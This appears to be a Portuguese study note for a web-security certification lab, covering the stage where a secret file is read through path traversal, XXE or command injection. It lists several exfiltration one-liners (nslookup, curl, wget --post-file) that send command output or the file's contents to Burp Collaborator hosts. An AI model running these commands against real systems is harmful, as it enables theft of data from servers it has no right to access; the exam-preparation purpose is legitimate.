# Etapa 3 - Exfiltração de Dados

Nessa etapa você precisa ler o conteúdo do arquivo `/home/carlos/secret` para submeter como solução da aplicação.

Baseado nisso, tenha em mente que as vulnerabilidades ou resultaram em leitura de arquivo (Path Traversal, XXE, etc) ou em RCE (OS Command Injection, SSTI, etc).

<br>

> [!WARNING]  
> Essa dica é semelhante ao da Etapa 2, mas um pouco mais raro de acontecer porque não tem um botão que faça isso pra você. Se você alcançar RCE, obviamente você não pode deletar o arquivo **/home/carlos/secret**, já que não tem como pedir um reset das aplicações. É importante mencionar isso porque na maioria dos laboratórios usamos comandos para DELETAR um arquivo, em vez de lê-lo.

<br>

Abaixo seguem algumas possibilidades de comando para exfiltrar o arquivo secret:
```
nslookup `whoami`.BURP-COLLABORATOR-SUBDOMAIN

curl burp.oastify.com?c=`whoami`

nslookup -q=cname+$(whoami).burp.oastify.com

$(curl $(cat /home/carlos/secret).OASTIFY.COM)

/usr/bin/wget --post-file /home/carlos/secret https://collaborator/
```
